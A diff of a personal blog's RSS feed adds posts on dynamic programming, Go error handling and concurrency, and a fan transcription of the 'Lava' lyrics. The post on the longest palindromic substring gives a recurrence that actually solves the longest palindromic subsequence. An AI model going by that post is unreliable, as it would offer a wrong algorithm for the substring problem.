@@ -5,9 +5,1135 @@
     <description>Pufan Jiang&#39;s personal blog, including lots of tech blogs, photo shooting etc.</description>
     <link>http://huangxuan.me/</link>
     <atom:link href="http://huangxuan.me/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Sat, 05 Mar 2016 01:02:51 -0800</pubDate>
-    <lastBuildDate>Sat, 05 Mar 2016 01:02:51 -0800</lastBuildDate>
+    <pubDate>Fri, 03 Feb 2017 21:19:56 +0800</pubDate>
+    <lastBuildDate>Fri, 03 Feb 2017 21:19:56 +0800</lastBuildDate>
     <generator>Jekyll v2.4.0</generator>
+    
+      <item>
+        <title>DP分析之最长回文子串</title>
+        <description>&lt;p&gt;最长回文子串(Longest Palindrome Substring)&lt;/p&gt;
+
+&lt;p&gt;Leetcode描述&lt;a href=&quot;https://leetcode.com/problems/longest-palindromic-substring/&quot;&gt;在此&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;DP四步骤：&lt;/p&gt;
+
+&lt;p&gt;1.寻找最优子结构&lt;/p&gt;
+
+&lt;p&gt;首先直接想到的是，如果知道i到j范围内的最优解，能否得知i到j+1的最优解。然而发现，可能最优解是i+1到j。联想到回文是一个头尾都要考虑的结构，所以修改子结构为，已知i到j-1内的最优解，以及i+1到j内的最优解，能否得到i到j内的最优解。&lt;/p&gt;
+
+&lt;p&gt;思考后发现是可以的。如果i和j相同，那么最优解就是i+1到j-1的最优解在加上i和j。如果不同，则比较i+1到j，和i到j-1，看哪个更长。&lt;/p&gt;
+
+&lt;p&gt;2.写出递推公式&lt;/p&gt;
+
+&lt;p&gt;f(i, j)表示i到j内的最优解（包括i和j）&lt;/p&gt;
+
+&lt;p&gt;f(i, j) = 1 //if i == j&lt;br /&gt;
+          2 + f(i+1, j-1) //if word[i] = word[j]&lt;br /&gt;
+          max(f(i+1, j), f(i, j-1)) //if word[i] != word[j]&lt;/p&gt;
+
+&lt;p&gt;3.算法实现&lt;/p&gt;
+
+&lt;p&gt;参考&lt;a href=&quot;https://github.com/otnt/CodeChallenge/blob/master/Algorithm/DynamicProgramming/LongestPalindromeSubsequence.java&quot;&gt;github&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;4.反推最优结果&lt;/p&gt;
+
+&lt;p&gt;这个非常直观，在维护最优解的长度时，同时维护具体内容即可。&lt;/p&gt;
+
+&lt;p&gt;s(i, j) = word[i] //if i == j&lt;br /&gt;
+          word[i] + s(i+1, j-1) + word[j] //if word[i] = word[j]&lt;br /&gt;
+          max(s(i+1, j), s(i, j-1)) //if word[i] != word[j]&lt;/p&gt;
+
+&lt;p&gt;5.优化&lt;/p&gt;
+
+&lt;p&gt;空间复杂度可优化到O(N)，当前是O(N^2)&lt;/p&gt;
+
+</description>
+        <pubDate>Sat, 21 May 2016 12:25:00 +0800</pubDate>
+        <link>http://huangxuan.me/2016/05/21/dp-analysis-longest-palindrome-substring/</link>
+        <guid isPermaLink="true">http://huangxuan.me/2016/05/21/dp-analysis-longest-palindrome-substring/</guid>
+        
+        <category>algorithm</category>
+        
+        <category>interview</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>动态规划题目的一般化</title>
+        <description>&lt;p&gt;最近在实习，做题的时间非常有限。翻了下算法导论中动态规划一章，觉得讲的着实好。动态规划其实非常有迹可循，而面试算法考法更是有限。在此分享一下我读了算法导论这一章后对动规解题思路的理解（其中很多内容和我之前&lt;a href=&quot;http://otnt.github.io/2016/04/29/dynamic-programming/&quot;&gt;一篇博文&lt;/a&gt;中的思路不谋而合）。&lt;/p&gt;
+
+&lt;h3 id=&quot;dp&quot;&gt;1. DP要点&lt;/h3&gt;
+
+&lt;p&gt;1.1 DP一般用于优化问题（optimization problem）。这类问题有很多解，DP能快速找到&lt;em&gt;一个最优解&lt;/em&gt;（可能存在多个最优解）。 &lt;br /&gt;
+1.2 DP适用于子问题有&lt;em&gt;Overlap&lt;/em&gt;的情况，即子问题之间共享相同的子子问题，或者说，上层解会&lt;em&gt;反复&lt;/em&gt;依赖已经计算过的下层解。而Divide-and-Conquer适用于子问题独立的情况，递归地去解决子问题。&lt;br /&gt;
+1.3 存在&lt;em&gt;独立最优子结构&lt;/em&gt;（independent optimal substructure）。即最优化结构要能够由最优子结构独立推导出，而不受其他最优化结构影响。&lt;/p&gt;
+
+&lt;h3 id=&quot;dp-1&quot;&gt;2.DP四步骤&lt;/h3&gt;
+
+&lt;p&gt;3.1 找到最优子结构，即如何由optimal substructure推导出optimal structure.&lt;br /&gt;
+3.2 寻找第一步推导的公式，一般用递归的思想去思考&amp;amp;定义。&lt;br /&gt;
+3.3 设计算法实现。一般用bottom-up的方式去实现。&lt;br /&gt;
+3.4 反推具体的最优解，一般通过同时维护另一个存储空间来实现。&lt;/p&gt;
+
+&lt;h3 id=&quot;dp-case-study&quot;&gt;3. DP Case Study&lt;/h3&gt;
+
+&lt;p&gt;这里分享一些我做DP题目的四步骤。(不断更新)&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;&quot;&gt;最长回文子串&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Sat, 21 May 2016 12:22:00 +0800</pubDate>
+        <link>http://huangxuan.me/2016/05/21/dynamic-programming-intro-to-algo/</link>
+        <guid isPermaLink="true">http://huangxuan.me/2016/05/21/dynamic-programming-intro-to-algo/</guid>
+        
+        <category>algorithm</category>
+        
+        <category>interview</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>皮克斯唯美爱情微电影《Lava》</title>
+        <description>&lt;p&gt;过去的一周，和我生命中的奇迹—饼妹—一起在甘肃南部游玩。期间看了这个微电影，非常喜欢电影中尤克里里欢快的配乐，可爱的卡通形象，和优美的歌词。在此将个人听译的歌词分享给大家。&lt;/p&gt;
+
+&lt;p&gt;视频链接:&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MjM5MzAxNjEyMA==&amp;amp;mid=402981239&amp;amp;idx=2&amp;amp;sn=63dd7d2a1b52219f2b5b4166fbfd72cb&amp;amp;scene=1&amp;amp;srcid=0510bSxPN9RUDmhuacJAqxaP&amp;amp;key=b28b03434249256b733cdf85ce1d5d08397eabfd8bb1b7ff8c6adbe08c69e67f152ebf50229b1f73fa6d5326ac9aaeab&amp;amp;ascene=0&amp;amp;uin=MjE4NjE2NDIyNQ%3D%3D&amp;amp;devicetype=iMac+MacBookPro11%2C1+OSX+OSX+10.11.3+build(15D21)&amp;amp;version=11020201&amp;amp;pass_ticket=G6VwcFos76BfdpHPhXOePo%2BKHZJEaGQZbo6txWvPGfvM5msze%2Bsd4DJm2SgsCGFY&quot;&gt;点击此处&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;歌词：&lt;/p&gt;
+
+&lt;p&gt;A long long time ago, there was a volcano&lt;/p&gt;
+
+&lt;p&gt;Living all alone in the middle of the sea&lt;/p&gt;
+
+&lt;p&gt;He sat high above his span, watching all the couples play&lt;/p&gt;
+
+&lt;p&gt;And wishing that, he had some one too&lt;/p&gt;
+
+&lt;p&gt;And from his lava came this song of hope that he sang out love everyday for years and years&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;[Volcano:]&lt;/p&gt;
+
+&lt;p&gt;I have a dream.&lt;/p&gt;
+
+&lt;p&gt;I hope it will come true.&lt;/p&gt;
+
+&lt;p&gt;You are here with me, and I’m here with you.&lt;/p&gt;
+
+&lt;p&gt;I wish that the earth see the sky up above, will send me someone to lava&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Years of singing all alone, turn his lava into stone&lt;/p&gt;
+
+&lt;p&gt;** until he was on the green extinction?&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;But little did he know that living in the sea below&lt;/p&gt;
+
+&lt;p&gt;One other volcano was listening to his song&lt;/p&gt;
+
+&lt;p&gt;Everyday she heard this too&lt;/p&gt;
+
+&lt;p&gt;Her lava grew and grew&lt;/p&gt;
+
+&lt;p&gt;Because she believed his song was made for her&lt;/p&gt;
+
+&lt;p&gt;Now she was so ready to meet him above the sea&lt;/p&gt;
+
+&lt;p&gt;As he sang his song of hope for the last time&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;[Volcano:]&lt;/p&gt;
+
+&lt;p&gt;I have a dream.&lt;/p&gt;
+
+&lt;p&gt;I hope it will come true.&lt;/p&gt;
+
+&lt;p&gt;You are here with me, and I’m here with you.&lt;/p&gt;
+
+&lt;p&gt;I wish that the earth see the sky up above, will send me someone to lava&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Rising from the sea below stood the lovely volcano&lt;/p&gt;
+
+&lt;p&gt;Looking all around but she could not see him&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;He tried to sing to let her know that she was not there alone&lt;/p&gt;
+
+&lt;p&gt;** but with no lava has some one so gone&lt;/p&gt;
+
+&lt;p&gt;He felt the sea with his tears&lt;/p&gt;
+
+&lt;p&gt;And watched his dream disappear&lt;/p&gt;
+
+&lt;p&gt;Yet she remembered what his song meant to her&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;[Volcano:]&lt;/p&gt;
+
+&lt;p&gt;I have a dream.&lt;/p&gt;
+
+&lt;p&gt;I hope it will come true.&lt;/p&gt;
+
+&lt;p&gt;You are here with me, and I’m here with you.&lt;/p&gt;
+
+&lt;p&gt;I wish that the earth see the sky up above, will send me someone to lava&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Oh they were so happy&lt;/p&gt;
+
+&lt;p&gt;To finally meet above the sea&lt;/p&gt;
+
+&lt;p&gt;All together now their lava grew and grew&lt;/p&gt;
+
+&lt;p&gt;No longer are they all alone&lt;/p&gt;
+
+&lt;p&gt;** with the loha? as their new home?&lt;/p&gt;
+
+&lt;p&gt;And when we visited down, this is what  they sing&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;[Volcanos together:]&lt;/p&gt;
+
+&lt;p&gt;I have a dream.&lt;/p&gt;
+
+&lt;p&gt;I hope it will come true.&lt;/p&gt;
+
+&lt;p&gt;Now you grow old with me, and I’ll grow old with you.&lt;/p&gt;
+
+&lt;p&gt;We thank the earth till the sky we’ve been to&lt;/p&gt;
+
+&lt;p&gt;I lava you&lt;/p&gt;
+
+&lt;p&gt;I lava you&lt;/p&gt;
+
+&lt;p&gt;I lava you&lt;/p&gt;
+
+&lt;p&gt;[End]&lt;/p&gt;
+</description>
+        <pubDate>Thu, 12 May 2016 00:50:00 +0800</pubDate>
+        <link>http://huangxuan.me/2016/05/12/lava-love/</link>
+        <guid isPermaLink="true">http://huangxuan.me/2016/05/12/lava-love/</guid>
+        
+        <category>movie</category>
+        
+        <category>love story</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>一道题分析动态规划</title>
+        <description>&lt;p&gt;动态规划（Dynamic Programming）是面试算法常见考点。能够同时考察抽象总结以及归纳能力（需要计算递推公式，要知道递推在美国人眼里是很高级的技巧），以及coding的能力（动态规划一般要设计二维数组，以及复杂容易出错的index）。&lt;/p&gt;
+
+&lt;p&gt;这篇博客，我试图通过求解Leetcode经典题目，&lt;a href=&quot;https://leetcode.com/problems/best-time-to-buy-and-sell-stock-iv/&quot;&gt;Best Time to Buy and Sell Stock IV&lt;/a&gt;, 来分析一下DP的总体思路。欢迎拍砖。&lt;/p&gt;
+
+&lt;h2 id=&quot;section&quot;&gt;背景&lt;/h2&gt;
+
+&lt;p&gt;一句话总结，动态规划是一个算法技巧，要解决大而复杂的问题，先解决小一点简单一点的问题，直到最简单的情况是可以直接得出结果，那么就能一步步反推出最终答案。&lt;/p&gt;
+
+&lt;p&gt;听着和Conquer and Division很像，他们的差别是：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;C&amp;amp;D一般是递归做法，DP一般是迭代做法&lt;/li&gt;
+  &lt;li&gt;C&amp;amp;D一般对应二分，而DP一般对应递推。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;dp&quot;&gt;DP几大要素：&lt;/h2&gt;
+
+&lt;p&gt;个人经验，认为DP有以下要素：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;识别DP&lt;/li&gt;
+  &lt;li&gt;找递推关系&lt;/li&gt;
+  &lt;li&gt;边界划分&lt;/li&gt;
+  &lt;li&gt;初始化&lt;/li&gt;
+  &lt;li&gt;例子验算&lt;/li&gt;
+  &lt;li&gt;优化&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h4 id=&quot;dp-1&quot;&gt;识别DP&lt;/h4&gt;
+
+&lt;p&gt;引自九章算法：&lt;/p&gt;
+
+&lt;p&gt;如果题目目的是求最大值，最短距离，路径数量 etc. 而非求具体组合，具体点，每一条路径，那么很可能是DP。（求某一个组合，可能是DP+backtracking，求所有组合，则一般不是DP）&lt;/p&gt;
+
+&lt;h4 id=&quot;section-1&quot;&gt;找递推关系&lt;/h4&gt;
+
+&lt;p&gt;递推关系没有固定的套路，但简单地说有两种，一种是从头开始递推，一种是从尾部开始递推。思考的时候都要想到。&lt;/p&gt;
+
+&lt;p&gt;从头开始递推例子：Best Time to Buy and Sell Stock &lt;a href=&quot;https://leetcode.com/problems/best-time-to-buy-and-sell-stock/&quot;&gt;1&lt;/a&gt;, &lt;a href=&quot;https://leetcode.com/problems/best-time-to-buy-and-sell-stock-iii/&quot;&gt;3&lt;/a&gt;, &lt;a href=&quot;https://leetcode.com/problems/best-time-to-buy-and-sell-stock-iv/&quot;&gt;4&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;从尾部开始递推例子: &lt;a href=&quot;https://leetcode.com/problems/best-time-to-buy-and-sell-stock-with-cooldown/&quot;&gt;Best Time to Buy and Sell Stock with Cooldown&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;另一点是必须把递推关系写出来，可以从中找优化，并且可以帮助写code。&lt;/p&gt;
+
+&lt;h4 id=&quot;section-2&quot;&gt;边界划分&lt;/h4&gt;
+
+&lt;p&gt;边界划分是分析，如果dp[k][i]表示第k层dp，位置从0到i范围，求取得到的最大值/最短距离 etc， 那么这个i表示的是什么。是一定要用到第i个数字吗，还是只需要是这个范围内的最大值。&lt;/p&gt;
+
+&lt;p&gt;具体体验可以做 best stock &lt;a href=&quot;https://leetcode.com/problems/best-time-to-buy-and-sell-stock-iv/&quot;&gt;4&lt;/a&gt;, 以及括号匹配数量(链接待补充)。&lt;/p&gt;
+
+&lt;h4 id=&quot;section-3&quot;&gt;初始化&lt;/h4&gt;
+
+&lt;p&gt;顾名思义，最开始的值是多少。一般会有一行、一列辅助值，帮助初始化。&lt;/p&gt;
+
+&lt;h4 id=&quot;section-4&quot;&gt;例子验算(重要)&lt;/h4&gt;
+
+&lt;p&gt;在实际写dp算法时，强烈建议先有一个演算好的例子，这样在写具体代码，尤其是index时，会清晰很多。另外DP常常需要保存中间变量，这个也在例子演算中标示出来会比较好。&lt;/p&gt;
+
+&lt;h4 id=&quot;section-5&quot;&gt;优化&lt;/h4&gt;
+
+&lt;p&gt;这里优化指的是最后一步细节上的优化，总体时间复杂度已经无法再下降了。&lt;/p&gt;
+
+&lt;p&gt;常见的优化有：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;滚动数组，节省空间&lt;/li&gt;
+  &lt;li&gt;剪枝，提早结束dp过程&lt;/li&gt;
+  &lt;li&gt;特殊情况使用另一种更高效的算法&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;section-6&quot;&gt;例子分析&lt;/h2&gt;
+
+&lt;p&gt;如前所述，使用Leetcode经典题目，&lt;a href=&quot;https://leetcode.com/problems/best-time-to-buy-and-sell-stock-iv/&quot;&gt;Best Time to Buy and Sell Stock IV&lt;/a&gt;, 来分析一下DP的总体思路。&lt;/p&gt;
+
+&lt;h4 id=&quot;dp-2&quot;&gt;识别DP&lt;/h4&gt;
+
+&lt;p&gt;求最大price，符合DP条件。&lt;/p&gt;
+
+&lt;h4 id=&quot;section-7&quot;&gt;找递推关系 &amp;amp; 边界划分&lt;/h4&gt;
+
+&lt;p&gt;递推关系的思考套路是，如果我已经知道1是怎么样，那么2是怎么样也知道，那么3是什么样也知道 etc&lt;/p&gt;
+
+&lt;p&gt;在这里，转化成两个思考问题：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;如果我知道只有1笔transaction的结果，能否算出2笔transaction的结果？&lt;/li&gt;
+  &lt;li&gt;如果我知道给定[0, i]范围交易结果，能否算出[0, i+1]的交易结果？&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;这道题如果研究清楚这两个递推关系，就算解决问题。&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;1笔transaction推导2笔transaction&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;不难想到，如果我们知道[0, 1], [0,2], … , [0, i]的1笔transaction的交易结果，那么[0, i]的2笔transaction的交易结果，就是[0,1] - price[1]+price[i], …, [0, i-1] - price[i-1]+price[i]中的最大值。&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;[0, i]推导[0, i+1]&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;这个只要思考1笔transaction时是怎么样，其他情况类似。也不难想到，这个就是price[i+1] - min(price[0…i])和[0, i]中取较大值。&lt;/p&gt;
+
+&lt;p&gt;关于边界划分，这里我当时犯了个错误，导致耽误了不少时间。就是[0, i]是表示必须以price[i]卖出呢，还是给定price[0, i]算出一个最大值，即[0, i]是一个单调递增序列。&lt;/p&gt;
+
+&lt;p&gt;通过上面的结论我们已经得出，应该是第二种情况，但是实际思考时，都要想一下。&lt;/p&gt;
+
+&lt;p&gt;另外值得一提，这道题要求是最多交易K笔，所以算出2笔transaction的结果，实际上表示是最多2笔transaction的结果，即如果1笔的结果更高，就保留1笔。&lt;/p&gt;
+
+&lt;p&gt;最后推导递推公式。（实际上，这一步可以在例子验算之后进行）&lt;/p&gt;
+
+&lt;p&gt;f(k)(i) = max(f(k)(i-1), max(f(k-1)(j)-price[j]+price[i]) where j=0…i-1)&lt;/p&gt;
+
+&lt;p&gt;这里通过递推公式我们发现，每次计算f(k)(i) 一个0到i-1的j合集，这导致复杂度上升一个数量级。但是仔细观察，我们可以发现max(f(k-1)(j)-price[j]+price[i])中price[i]这一项是不变量，可以提取出来。即&lt;/p&gt;
+
+&lt;p&gt;f(k)(i) = max(f(k)(i-1), price[i] + max(f(k-1)(j)-price[j]) where j=0…i-1)&lt;/p&gt;
+
+&lt;p&gt;而max(f(k-1)(j)-price[j]) 这一项是可以在遍历时候维护的，因此每个f(k)(i)的计算复杂度为O(1)。&lt;/p&gt;
+
+&lt;p&gt;总的时间复杂度为O(kN)&lt;/p&gt;
+
+&lt;h4 id=&quot;section-8&quot;&gt;例子验算&lt;/h4&gt;
+
+&lt;p&gt;例子验算对DP非常重要:&lt;br /&gt;
+ - 验证正确性&lt;br /&gt;
+ - 将coding过程直观化&lt;/p&gt;
+
+&lt;p&gt;我们以&lt;a href=&quot;http://www.lintcode.com/zh-cn/problem/best-time-to-buy-and-sell-stock-iv/&quot;&gt;lintcode上的股票例子&lt;/a&gt;为例:&lt;/p&gt;
+
+&lt;p&gt;[4,4,6,1,1,4,2,5] k = 2, ans = 6&lt;/p&gt;
+
+&lt;p&gt;这是price list&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;[]()&lt;/th&gt;
+      &lt;th&gt; &lt;/th&gt;
+      &lt;th&gt; &lt;/th&gt;
+      &lt;th&gt; &lt;/th&gt;
+      &lt;th&gt; &lt;/th&gt;
+      &lt;th&gt; &lt;/th&gt;
+      &lt;th&gt; &lt;/th&gt;
+      &lt;th&gt; &lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;4&lt;/td&gt;
+      &lt;td&gt;4&lt;/td&gt;
+      &lt;td&gt;6&lt;/td&gt;
+      &lt;td&gt;1&lt;/td&gt;
+      &lt;td&gt;1&lt;/td&gt;
+      &lt;td&gt;4&lt;/td&gt;
+      &lt;td&gt;2&lt;/td&gt;
+      &lt;td&gt;5&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;这里每行k每列i是交易k次，并且给定[0, i]的price list，最多能成多少钱。&lt;/p&gt;
+
+&lt;p&gt;另外根据上面的分析，我们需要一个变量（maxSub）来保存max(f(k-1)(j)-price[j])&lt;/p&gt;
+
+&lt;p&gt;回顾递推公式：f(k)(i) = max(f(k)(i-1), price[i] + max(f(k-1)(j)-price[j]) where j=0…i-1)&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;i=0&lt;/th&gt;
+      &lt;th&gt;i=1&lt;/th&gt;
+      &lt;th&gt;i=2&lt;/th&gt;
+      &lt;th&gt;i=3&lt;/th&gt;
+      &lt;th&gt;i=4&lt;/th&gt;
+      &lt;th&gt;i=5&lt;/th&gt;
+      &lt;th&gt;i=6&lt;/th&gt;
+      &lt;th&gt;i=7&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0&lt;/td&gt;
+      &lt;td&gt;0&lt;/td&gt;
+      &lt;td&gt;0&lt;/td&gt;
+      &lt;td&gt;0&lt;/td&gt;
+      &lt;td&gt;0&lt;/td&gt;
+      &lt;td&gt;0&lt;/td&gt;
+      &lt;td&gt;0&lt;/td&gt;
+      &lt;td&gt;0&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0 maxSub = -4&lt;/td&gt;
+      &lt;td&gt;0 maxSub = -4&lt;/td&gt;
+      &lt;td&gt;2 maxSub = -4&lt;/td&gt;
+      &lt;td&gt;2 maxSub = -1&lt;/td&gt;
+      &lt;td&gt;2 maxSub = -1&lt;/td&gt;
+      &lt;td&gt;3 maxSub = -1&lt;/td&gt;
+      &lt;td&gt;3 maxSub = -1&lt;/td&gt;
+      &lt;td&gt;4 maxSub = -1&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0 maxSub = -4&lt;/td&gt;
+      &lt;td&gt;0 maxSub = -4&lt;/td&gt;
+      &lt;td&gt;2 maxSub = -4&lt;/td&gt;
+      &lt;td&gt;2 maxSub = 1&lt;/td&gt;
+      &lt;td&gt;2 maxSub = 1&lt;/td&gt;
+      &lt;td&gt;5 maxSub = 1&lt;/td&gt;
+      &lt;td&gt;5 maxSub = 1&lt;/td&gt;
+      &lt;td&gt;6 maxSub = 1&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;通过这个例子验算，我们在具体coding的时候，更容易写出bug free的代码。&lt;/p&gt;
+
+&lt;h4 id=&quot;section-9&quot;&gt;初始化&lt;/h4&gt;
+
+&lt;p&gt;这题有三个初始化，前两个是k为0的时候，以及i为0的时候 dp矩阵的值。不难理解都应该是0.&lt;/p&gt;
+
+&lt;p&gt;另一个更重要的是maxSub的初始化，由于交易至少需要2个记录，因此i=0的时候可以算作买入的初始化。这样每次i从1开始遍历，而不是从0开始。&lt;/p&gt;
+
+&lt;h4 id=&quot;section-10&quot;&gt;优化&lt;/h4&gt;
+
+&lt;p&gt;本体可以有不少优化。&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;滚动数组&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;由于每次只需要上一行的值，因此保留两行即可。（没有实现这个优化，建议可以用两个arraylist，每次结束后指针互换）&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;剪枝&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;如果发现dp[k][7] &amp;lt; dp[k-1][7],则可以结束。因为多了一笔交易不会变好，再多一笔也无济于事。&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;特殊情况&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;这个是被leetcode逼的，不得不说leetcode的检测数据比lintcode不知道高到哪里去了。&lt;/p&gt;
+
+&lt;p&gt;当K非常大，大到比price数量还多的时候，完全可以用&lt;a href=&quot;https://leetcode.com/problems/best-time-to-buy-and-sell-stock-iii/&quot;&gt;任意次交易算法&lt;/a&gt; 来O(N)时间完成。&lt;/p&gt;
+
+&lt;h2 id=&quot;section-11&quot;&gt;总结&lt;/h2&gt;
+
+&lt;p&gt;写了这么多，也只是举了一个栗子，具体还要多多体会。&lt;/p&gt;
+
+&lt;p&gt;总结DP思路：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;发现是DP（成功的开始）&lt;/li&gt;
+  &lt;li&gt;初步寻找递推关系和边界条件。思考并写出递推关系式子。注意，这一步不要求最优，如果只是一些地方需要反复扫描，导致O(N)变成O(N^2)完全没问题。(进入DP大门)&lt;/li&gt;
+  &lt;li&gt;演算，验证递推关系的正确性。&lt;/li&gt;
+  &lt;li&gt;核心优化。如果第二步的推导不是最优，比如有明显的反复扫描，就要思考能不能把这个过程抹去，常见的是在扫描的过程中维护若干变量。(DP优化难点，面试的重点)&lt;/li&gt;
+  &lt;li&gt;补充演算，验证优化的正确性。&lt;/li&gt;
+  &lt;li&gt;coding&lt;/li&gt;
+  &lt;li&gt;优化&lt;/li&gt;
+&lt;/ol&gt;
+
+</description>
+        <pubDate>Fri, 29 Apr 2016 11:50:00 +0800</pubDate>
+        <link>http://huangxuan.me/2016/04/29/dynamic-programming/</link>
+        <guid isPermaLink="true">http://huangxuan.me/2016/04/29/dynamic-programming/</guid>
+        
+        <category>Algorithm</category>
+        
+        <category>Dynamic Programming</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>异常处理：Panic/Exception 对比 Return Error</title>
+        <description>&lt;p&gt;但凡编写实用的程序，都需要处理错误异常。常见的方法有两种，一种是抛出异常(throw Exception), 类似于Go语言中的panic, 另一种是返回一个错误标示, 类似于Go语言中返回error, 或是C语言中返回-1。&lt;/p&gt;
+
+&lt;p&gt;常常有人讨论哪种做法更好。我认为以下观点值得参考。&lt;/p&gt;
+
+&lt;p&gt;The rule is simple: if your function is in any way likely to fail, it should return an error. When I’m calling some other package, if it is well written I don’t have to worry about panics, except for, well, truly exceptional conditions, things I shouldn’t be expected to handle.&lt;/p&gt;
+
+&lt;p&gt;Talk about error-code-style and exception-catch-style (Suggested by &lt;a href=&quot;https://plus.google.com/+RussCox-rsc/posts/iqAiKAwP6Ce&quot;&gt;Ross Cox&lt;/a&gt;):&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://blogs.msdn.microsoft.com/oldnewthing/20040422-00/?p=39683/&quot;&gt;Blog 1&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://blogs.msdn.microsoft.com/oldnewthing/20050114-00/?p=36693&quot;&gt;Blog 2&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 20 Apr 2016 16:17:00 +0800</pubDate>
+        <link>http://huangxuan.me/2016/04/20/Panic-vs-Return-Error/</link>
+        <guid isPermaLink="true">http://huangxuan.me/2016/04/20/Panic-vs-Return-Error/</guid>
+        
+        <category>Go</category>
+        
+        <category>Panic</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Concurrency vs. Parallelism</title>
+        <description>&lt;p&gt;These notes are quoted from &lt;a href=&quot;https://www.youtube.com/watch?v=f6kdp27TYZs&quot;&gt;Go Concurrency Patterns&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;what-is-concurrency&quot;&gt;What is Concurrency&lt;/h3&gt;
+
+&lt;p&gt;Programming as the composition of independently executing processes.&lt;/p&gt;
+
+&lt;h3 id=&quot;what-is-parallelism&quot;&gt;What is Parallelism&lt;/h3&gt;
+
+&lt;p&gt;Programming as the simultaneous execution of (possibly related) computations.&lt;/p&gt;
+
+&lt;h3 id=&quot;concurrency-vs-parallelism&quot;&gt;Concurrency vs. Parallelism&lt;/h3&gt;
+
+&lt;p&gt;Concurrency is about dealing with lots of things at once.&lt;/p&gt;
+
+&lt;p&gt;Parallelism is about doing lots of things at once.&lt;/p&gt;
+
+&lt;p&gt;One is about structure, one is about execution.&lt;/p&gt;
+
+&lt;p&gt;Concurrency provides a way to structure a solution to solve a problem that may (but not necessarily) be parallelizable.&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 20 Apr 2016 13:22:00 +0800</pubDate>
+        <link>http://huangxuan.me/2016/04/20/concurrency-vs-parallelism/</link>
+        <guid isPermaLink="true">http://huangxuan.me/2016/04/20/concurrency-vs-parallelism/</guid>
+        
+        <category>Go</category>
+        
+        <category>Concurrency</category>
+        
+        <category>Parallelism</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>A cheatsheet on basic of Go language</title>
+        <description>&lt;h1 id=&quot;a-cheatsheet-on-basic-of-go-language&quot;&gt;A cheatsheet on basic of Go language&lt;/h1&gt;
+
+&lt;p&gt;A collection of basic knowledge of Go language.&lt;/p&gt;
+
+&lt;p&gt;Suitable for people who are both:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Familiar with (not necessary expert at) some other language, preferably C/C++.&lt;/li&gt;
